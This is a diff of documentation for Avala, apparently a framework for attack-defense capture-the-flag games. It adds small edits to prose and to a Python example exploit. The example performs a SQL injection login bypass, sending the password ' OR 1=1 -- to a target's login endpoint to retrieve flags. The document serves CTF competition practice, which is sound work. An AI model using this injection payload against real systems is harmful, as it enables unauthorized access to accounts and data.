@@ -13,9 +13,9 @@ Each player on the team should have **Avala client** installed on their own mach
 
 ---
 
-When developing exploits with Avala, you can focus just on the core logic of the attack. Avala will handle all the surrounding tasks, such as obtaining target IPs, fetching corresponding flag IDs, keeping attacks in sync with the game tick, and extracting flags from strings.
+When developing exploits with Avala, you can focus just on the core logic of the attack. Avala will handle all the surrounding tasks, such as obtaining target IPs, fetching corresponding flag IDs, keeping attacks in sync with the game tick, and extracting flags from any strings or objects that you return.
 
-The following example shows a simple login bypass using a username provided in a flag ID (e.g. `"{\"username\": \"johndoe\"}"`). After successful login, the flag will be *somewhere* in the response.
+The following example shows a simple login bypass using a username provided in a flag ID (e.g. `"{\"username\": \"johndoe\"}"`). After a successful login, the flag will be *somewhere* in the response and Avala will pick it up for submitting.
 
 ```py
 from avala import exploit
@@ -25,6 +25,7 @@ import requests
 
 @exploit(service="foobar")
 def attack(target: str, flag_ids: str):
+    url = f"http://{target}:5000/login"
     username = json.loads(flag_ids)["username"]
 
     payload = {
@@ -32,10 +33,10 @@ def attack(target: str, flag_ids: str):
         "password": "' OR 1=1 --"
     }
 
-    response = requests.post(f"http://{target}:5000/login", json=payload)
+    response = requests.post(url, json=payload)
     return response.text
 ```
 
 ---
 
-To get started, first you will need to prepare your workspace and install Avala library. 🚀
+To get started, first you will need to prepare your workspace and [install Avala library](./setup.md). 🚀
